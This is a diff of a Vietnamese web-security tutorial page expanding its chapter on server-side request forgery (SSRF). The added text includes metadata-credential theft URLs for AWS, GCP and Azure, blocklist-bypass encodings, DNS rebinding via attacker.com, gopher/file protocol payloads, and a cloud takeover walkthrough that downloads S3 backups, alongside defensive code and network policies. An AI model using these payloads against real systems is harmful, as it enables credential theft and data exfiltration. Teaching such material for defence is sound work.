@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 15: SSRF — Hieu Nguyen</title>
-  <meta name="description" content="SSRF, IMDS, allowlist, egress, metadata hop limit.">
+  <title>Chương 15: SSRF — Server-Side Request Forgery — Hieu Nguyen</title>
+  <meta name="description" content="Chương 15: SSRF — Server-Side Request Forgery — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,58 +40,417 @@
         <span>›</span>
         <span>15. SSRF</span>
       </div>
-      <h1>Chương 15: SSRF</h1>
-      <p class="lede">Server đi fetch URL hộ user. Cloud metadata và Kubernetes API ở ngay góc mạng đó.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> V — Server-side</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>SSRF: app mở kết nối tới URL attacker chỉ định (webhook, preview, import). Mục tiêu: localhost, RFC1918, IMDS <code>169.254.169.254</code>, kube API.</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Allowlist scheme + host; DNS rebinding: resolve rồi khóa IP, cấm redirect lệch.</li>
-        <li>Không tin URL user cho file://.</li>
-        <li>IMDS v2 / hop-limit; NetworkPolicy deny metadata.</li>
-        <li>Webhook: IP allowlist customer, không server-side fetch tùy ý.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Đây là chương DevOps. Egress mặc định deny. ServiceAccount token không automount. Split webhook worker ra network riêng.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Allowlist URL.</li>
-        <li>Chặn IMDS.</li>
-        <li>Egress deny.</li>
-        <li>Không automount SA.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>IMDS liên quan SSRF thế nào?</li>
-        <li>DNS rebinding phá allowlist host ra sao?</li>
-        <li>Hop-limit IMDS giúp gì?</li>
-        <li>Webhook nên validate gì?</li>
-        <li>Kube API từ Pod app: control nào?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 15: SSRF — Server-Side Request Forgery</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>SSRF</strong> (Server-Side Request Forgery — Giả mạo yêu cầu phía server) là lỗ hổng cho phép hacker khiến server thực hiện HTTP requests đến địa chỉ tùy ý — thường là internal services không accessible từ internet.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Rất cao — SSRF là cổng vào internal network. Trong cloud environment, SSRF có thể dẫn đến credential theft từ metadata API và full cloud account takeover.</p>
+<p>SSRF đặc biệt nguy hiểm trong cloud và microservices architecture.</p>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-python"># App có feature load ảnh từ URL
+def load_image(url):
+    response = requests.get(url)  # Server fetch URL
+    return response.content
 
-      <div class="docs-tags">
-        <span class="docs-tag">ssrf</span>
-        <span class="docs-tag">imds</span>
-        <span class="docs-tag">owasp</span>
-      </div>
+# Normal: url = &quot;https://example.com/logo.png&quot;
+# Attack: url = &quot;http://169.254.169.254/latest/meta-data/&quot;
+#   → Server fetch AWS metadata → lộ IAM credentials!
+</code></pre>
+<hr>
+<h2 id="các-loại-ssrf">Các loại SSRF</h2>
+<h3 id="1-basic-ssrf--hiển-thị-response">1. Basic SSRF — Hiển thị response</h3>
+<p>Server fetch URL và trả về content cho user.</p>
+<pre><code class="language-http">POST /api/fetch-profile HTTP/1.1
+Content-Type: application/json
+
+{&quot;avatar_url&quot;: &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;}
+
+Response:
+{
+  &quot;content&quot;: &quot;my-ec2-role\n&quot;
+}
+
+Tiếp tục:
+{&quot;avatar_url&quot;: &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role&quot;}
+
+Response:
+{
+  &quot;content&quot;: &quot;{
+    \&quot;AccessKeyId\&quot;: \&quot;ASIA...\&quot;,
+    \&quot;SecretAccessKey\&quot;: \&quot;...\&quot;,
+    \&quot;Token\&quot;: \&quot;...\&quot;,
+    \&quot;Expiration\&quot;: \&quot;2024-01-01T00:00:00Z\&quot;
+  }&quot;
+}
+</code></pre>
+<h3 id="2-blind-ssrf--không-thấy-response">2. Blind SSRF — Không thấy response</h3>
+<p>Server fetch URL nhưng không trả về content. Chỉ biết qua side effects.</p>
+<pre><code class="language-text">- Thay đổi response time (target accessible vs. not)
+- Out-of-band: server gửi DNS query hoặc HTTP request đến attacker server
+</code></pre>
+<p><strong>Detection:</strong></p>
+<pre><code class="language-python"># Dùng Burp Collaborator (Pro) hoặc interactsh
+{&quot;webhook_url&quot;: &quot;https://YOUR_BURP_COLLABORATOR_URL&quot;}
+
+# Nếu server fetch URL → Collaborator nhận request → SSRF confirmed
+</code></pre>
+<h3 id="3-ssrf-với-localhost-bypass-authentication">3. SSRF với localhost bypass authentication</h3>
+<p>Nhiều internal services tin tưởng connections từ localhost (127.0.0.1):</p>
+<pre><code class="language-text"># Admin panel ẩn, chỉ accessible từ localhost
+GET /admin HTTP/1.1
+Host: example.com
+→ 403 Forbidden (từ internet)
+
+# Qua SSRF: server tự request đến chính nó
+{&quot;url&quot;: &quot;http://127.0.0.1/admin&quot;}
+→ Server fetch → Admin panel accessible → 200 OK
+</code></pre>
+<h3 id="4-ssrf-vào-internal-services">4. SSRF vào Internal Services</h3>
+<pre><code class="language-text"># Scan internal network
+{&quot;url&quot;: &quot;http://10.0.0.1:8080&quot;}    → Internal service
+{&quot;url&quot;: &quot;http://192.168.1.1&quot;}       → Router admin panel
+{&quot;url&quot;: &quot;http://172.16.0.1:6379&quot;}   → Redis
+{&quot;url&quot;: &quot;http://10.0.0.5:9200&quot;}     → Elasticsearch
+{&quot;url&quot;: &quot;http://10.0.0.10:27017&quot;}   → MongoDB
+
+# Internal Kubernetes services
+{&quot;url&quot;: &quot;http://kubernetes.default.svc.cluster.local&quot;}
+{&quot;url&quot;: &quot;http://kube-apiserver:6443&quot;}
+</code></pre>
+<hr>
+<h2 id="ssrf-trong-cloud--metadata-api">SSRF trong Cloud — Metadata API</h2>
+<p>Cloud providers có metadata service tại địa chỉ cố định:</p>
+<h3 id="aws-imdsv1-vulnerable--legacy">AWS IMDSv1 (Vulnerable — Legacy)</h3>
+<pre><code class="language-text">http://169.254.169.254/latest/meta-data/
+
+# Lấy IAM credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+# Response:
+{
+  &quot;Code&quot;: &quot;Success&quot;,
+  &quot;LastUpdated&quot;: &quot;2024-01-01T00:00:00Z&quot;,
+  &quot;Type&quot;: &quot;AWS-HMAC&quot;,
+  &quot;AccessKeyId&quot;: &quot;ASIAIOSFODNN7EXAMPLE&quot;,
+  &quot;SecretAccessKey&quot;: &quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&quot;,
+  &quot;Token&quot;: &quot;AQoXnyc4lcK4w...&quot;,
+  &quot;Expiration&quot;: &quot;2024-01-01T06:00:00Z&quot;
+}
+
+# Dùng credentials để access AWS services!
+export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
+export AWS_SESSION_TOKEN=AQoXnyc4lcK4w...
+aws s3 ls  # Access S3 với quyền của EC2 role
+</code></pre>
+<h3 id="aws-imdsv2-phòng-chống-ssrf">AWS IMDSv2 (Phòng chống SSRF)</h3>
+<pre><code class="language-text"># IMDSv2 yêu cầu PUT request trước để lấy token
+# SSRF qua fetch() không thể làm PUT request với custom header
+# → Phòng chống SSRF attacks
+
+curl -X PUT &quot;http://169.254.169.254/latest/api/token&quot; \
+     -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;
+→ TTL_TOKEN
+
+curl -H &quot;X-aws-ec2-metadata-token: $TTL_TOKEN&quot; \
+     http://169.254.169.254/latest/meta-data/
+</code></pre>
+<h3 id="gcp-metadata">GCP Metadata</h3>
+<pre><code class="language-text">http://metadata.google.internal/computeMetadata/v1/
+# Cần header: Metadata-Flavor: Google
+
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+→ Lấy access token của GCP service account
+
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+→ Lấy project ID
+</code></pre>
+<h3 id="azure-metadata">Azure Metadata</h3>
+<pre><code class="language-text">http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Cần header: Metadata: true
+
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/
+→ Lấy Azure managed identity token
+</code></pre>
+<hr>
+<h2 id="ssrf-bypass-techniques">SSRF Bypass Techniques</h2>
+<h3 id="bypass-ip-based-blocklist">Bypass IP-based blocklist</h3>
+<pre><code class="language-text"># Thay 127.0.0.1 bằng các cách biểu diễn khác
+127.0.0.1           → Bị block
+127.1               → IPv4 short form
+127.000.000.1       → Octal octets
+0x7f000001          → Hex
+2130706433          → Decimal (int representation)
+::1                 → IPv6 localhost
+[::1]               → IPv6 brackets
+0177.0.0.1          → Octal
+
+# Thay 169.254.169.254
+2852039166          → Decimal
+0xa9fea9fe          → Hex
+169.254.169.254     → Standard
+http://169.254.169.254 → có thể bị block nguyên URL
+</code></pre>
+<h3 id="dns-rebinding">DNS Rebinding</h3>
+<pre><code class="language-text">1. Hacker register domain: attacker.com
+2. DNS server của hacker trả về 169.254.169.254 (TTL=0)
+3. App resolve attacker.com → 169.254.169.254 không bị cache (TTL=0)
+4. App fetch http://attacker.com → thực ra request đến 169.254.169.254
+</code></pre>
+<h3 id="url-encoding-bypass">URL Encoding Bypass</h3>
+<pre><code class="language-text">http://127.0.0.1 → bị check
+http://127.0.0.1%0a.example.com → URL decode → có thể bypass
+http://%31%32%37%2e%30%2e%30%2e%31  → 127.0.0.1 encoded
+
+# Double URL encoding
+%2561 → %61 → a
+</code></pre>
+<h3 id="redirect-bypass">Redirect Bypass</h3>
+<pre><code class="language-text">1. App check URL → OK (example.com)
+2. Fetch URL → 302 Redirect → 169.254.169.254
+3. App follow redirect → metadata accessed!
+
+# Host open redirect
+{&quot;url&quot;: &quot;https://example.com/redirect?to=http://169.254.169.254/&quot;}
+</code></pre>
+<h3 id="protocol-alternatives">Protocol Alternatives</h3>
+<pre><code class="language-text">http://169.254.169.254    → check
+file:///etc/passwd         → đọc file local
+gopher://127.0.0.1:25/    → interact với SMTP
+gopher://127.0.0.1:6379/  → interact với Redis
+dict://127.0.0.1:6379/    → Redis dict protocol
+sftp://attacker.com       → SFTP
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-cloud-account-takeover">Kịch bản tấn công: Cloud Account Takeover</h2>
+<pre><code class="language-text">Target: Web app chạy trên AWS EC2 với IAM role có quyền S3 full access
+
+1. Find SSRF:
+   POST /api/screenshot?url=...
+   → App fetch URL và render screenshot
+
+2. Exploit SSRF:
+   POST /api/screenshot?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+   → Response: &quot;webapp-role&quot;
+
+3. Get credentials:
+   POST /api/screenshot?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role
+   → Response: {AccessKeyId, SecretAccessKey, Token}
+
+4. Use credentials từ laptop của hacker:
+   export AWS_ACCESS_KEY_ID=...
+   export AWS_SECRET_ACCESS_KEY=...
+   export AWS_SESSION_TOKEN=...
+   
+   aws s3 ls                          # List all buckets
+   aws s3 sync s3://company-backups . # Download tất cả backups
+   aws iam list-users                 # Enum IAM users
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Features nào nhận URL input?
+  - Image upload từ URL
+  - Webhook configuration
+  - PDF/screenshot generation
+  - API proxy/integration
+  - Import data từ URL
+  - Preview URL features
+
+□ Test với internal IPs:
+  http://127.0.0.1
+  http://localhost
+  http://169.254.169.254 (AWS metadata)
+  http://metadata.google.internal (GCP)
+
+□ Test với Burp Collaborator:
+  URL → có request đến Collaborator không?
+
+□ Check response time khác nhau cho accessible vs. non-accessible IPs
+□ Error messages tiết lộ internal services
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-allowlist-thay-vì-blocklist">1. Allowlist thay vì Blocklist</h3>
+<pre><code class="language-python">import ipaddress
+from urllib.parse import urlparse
+
+ALLOWED_DOMAINS = {
+    &#x27;example.com&#x27;,
+    &#x27;api.example.com&#x27;,
+    &#x27;storage.googleapis.com&#x27;,
+}
+
+def validate_url(url: str) -&gt; bool:
+    parsed = urlparse(url)
+    
+    # Chỉ cho phép HTTPS
+    if parsed.scheme != &#x27;https&#x27;:
+        return False
+    
+    # Whitelist domain (exact match)
+    hostname = parsed.netloc.split(&#x27;:&#x27;)[0].lower()
+    if hostname not in ALLOWED_DOMAINS:
+        return False
+    
+    return True
+
+def safe_fetch(url: str) -&gt; bytes:
+    if not validate_url(url):
+        raise ValueError(&quot;URL not allowed&quot;)
+    
+    response = requests.get(url, timeout=5, allow_redirects=False)
+    
+    # Không follow redirects tự động
+    if response.is_redirect:
+        raise ValueError(&quot;Redirects not allowed&quot;)
+    
+    return response.content
+</code></pre>
+<h3 id="2-network-level-blocking">2. Network-Level Blocking</h3>
+<pre><code class="language-python"># Resolve hostname và check IP không phải private range
+import socket
+import ipaddress
+
+PRIVATE_RANGES = [
+    ipaddress.ip_network(&#x27;10.0.0.0/8&#x27;),
+    ipaddress.ip_network(&#x27;172.16.0.0/12&#x27;),
+    ipaddress.ip_network(&#x27;192.168.0.0/16&#x27;),
+    ipaddress.ip_network(&#x27;127.0.0.0/8&#x27;),
+    ipaddress.ip_network(&#x27;169.254.0.0/16&#x27;),  # AWS metadata
+    ipaddress.ip_network(&#x27;::1/128&#x27;),           # IPv6 localhost
+    ipaddress.ip_network(&#x27;fc00::/7&#x27;),          # IPv6 private
+]
+
+def is_safe_ip(hostname: str) -&gt; bool:
+    try:
+        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
+        for private_range in PRIVATE_RANGES:
+            if ip in private_range:
+                return False
+        return True
+    except (socket.gaierror, ValueError):
+        return False
+</code></pre>
+<h3 id="3-aws-imdsv2--bắt-buộc-dùng">3. AWS IMDSv2 — Bắt buộc dùng</h3>
+<pre><code class="language-bash"># Khi launch EC2, disable IMDSv1
+aws ec2 modify-instance-metadata-options \
+    --instance-id i-1234567890abcdef0 \
+    --http-tokens required \
+    --http-put-response-hop-limit 1
+
+# Terraform:
+resource &quot;aws_instance&quot; &quot;app&quot; {
+  metadata_options {
+    http_endpoint = &quot;enabled&quot;
+    http_tokens   = &quot;required&quot;  # IMDSv2 required
+    http_put_response_hop_limit = 1
+  }
+}
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Kubernetes Network Policy — Block metadata access:</strong></p>
+<pre><code class="language-yaml"># Ngăn pods access AWS/GCP metadata service
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: block-metadata
+spec:
+  podSelector: {}  # Áp dụng cho tất cả pods
+  policyTypes:
+    - Egress
+  egress:
+    # Block 169.254.169.254 (metadata service)
+    # Kubernetes NetworkPolicy không hỗ trợ block by IP trực tiếp
+    # Dùng Calico hoặc Cilium NetworkPolicy cho IP-based rules
+</code></pre>
+<p><strong>Với Calico:</strong></p>
+<pre><code class="language-yaml">apiVersion: projectcalico.org/v3
+kind: GlobalNetworkPolicy
+metadata:
+  name: block-metadata
+spec:
+  selector: all()
+  types:
+    - Egress
+  egress:
+    - action: Deny
+      destination:
+        nets:
+          - &quot;169.254.169.254/32&quot;  # AWS metadata
+          - &quot;metadata.google.internal&quot;
+</code></pre>
+<p><strong>Service Account với minimal permissions:</strong></p>
+<pre><code class="language-json">// IAM role chỉ có quyền cần thiết
+{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [
+    {
+      &quot;Effect&quot;: &quot;Allow&quot;,
+      &quot;Action&quot;: [&quot;s3:GetObject&quot;],
+      &quot;Resource&quot;: &quot;arn:aws:s3:::my-specific-bucket/*&quot;
+    }
+  ]
+}
+// Không phải s3:* hay sts:AssumeRole
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>SSRF khiến server gửi requests đến internal services/metadata API.</li>
+<li>Trong cloud, SSRF → IMDSv1 metadata → IAM credentials → full account takeover.</li>
+<li>Bypass: hex/octal IP, DNS rebinding, redirect chains, alternative protocols.</li>
+<li>Phòng chống: URL allowlist (không blocklist), validate IP sau DNS resolution.</li>
+<li>AWS: bắt buộc IMDSv2 (http-tokens: required).</li>
+<li>Kubernetes: Network Policy block access đến metadata service.</li>
+<li>Least privilege IAM role — giảm impact khi SSRF xảy ra.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Tại sao SSRF trong cloud environment nguy hiểm hơn so với on-premises?</li>
+<li>AWS IMDSv2 ngăn chặn SSRF như thế nào? Tại sao IMDSv1 vulnerable?</li>
+<li>Blocklist approach kém hiệu quả hơn allowlist như thế nào? Cho ví dụ bypass.</li>
+<li>Khi validate URL để chống SSRF, tại sao cần resolve hostname và check IP?</li>
+<li>Mô tả DNS rebinding attack và tại sao nó bypass IP-based blocklist.</li>
+</ol>
       <div class="docs-pager">
-        <a href="../14/">Previous · 14. Command Injection</a>
-        <a href="../16/">Next · 16. XXE</a>
+        <a href="../25/">Previous · 25. SSTI</a>
+        <a href="../17/">Next · 17. File Upload</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#các-loại-ssrf">Các loại SSRF</a>
+        <a class="depth-3" href="#1-basic-ssrf--hiển-thị-response">1. Basic SSRF — Hiển thị response</a>
+        <a class="depth-3" href="#2-blind-ssrf--không-thấy-response">2. Blind SSRF — Không thấy response</a>
+        <a class="depth-3" href="#3-ssrf-với-localhost-bypass-authentication">3. SSRF với localhost bypass authentication</a>
+        <a class="depth-3" href="#4-ssrf-vào-internal-services">4. SSRF vào Internal Services</a>
+        <a href="#ssrf-trong-cloud--metadata-api">SSRF trong Cloud — Metadata API</a>
+        <a class="depth-3" href="#aws-imdsv1-vulnerable--legacy">AWS IMDSv1 (Vulnerable — Legacy)</a>
+        <a class="depth-3" href="#aws-imdsv2-phòng-chống-ssrf">AWS IMDSv2 (Phòng chống SSRF)</a>
+        <a class="depth-3" href="#gcp-metadata">GCP Metadata</a>
+        <a class="depth-3" href="#azure-metadata">Azure Metadata</a>
+        <a href="#ssrf-bypass-techniques">SSRF Bypass Techniques</a>
+        <a class="depth-3" href="#bypass-ip-based-blocklist">Bypass IP-based blocklist</a>
+        <a class="depth-3" href="#dns-rebinding">DNS Rebinding</a>
+        <a class="depth-3" href="#url-encoding-bypass">URL Encoding Bypass</a>
+        <a class="depth-3" href="#redirect-bypass">Redirect Bypass</a>
+        <a class="depth-3" href="#protocol-alternatives">Protocol Alternatives</a>
+        <a href="#kịch-bản-tấn-công-cloud-account-takeover">Kịch bản tấn công: Cloud Account Takeover</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-allowlist-thay-vì-blocklist">1. Allowlist thay vì Blocklist</a>
+        <a class="depth-3" href="#2-network-level-blocking">2. Network-Level Blocking</a>
+        <a class="depth-3" href="#3-aws-imdsv2--bắt-buộc-dùng">3. AWS IMDSv2 — Bắt buộc dùng</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
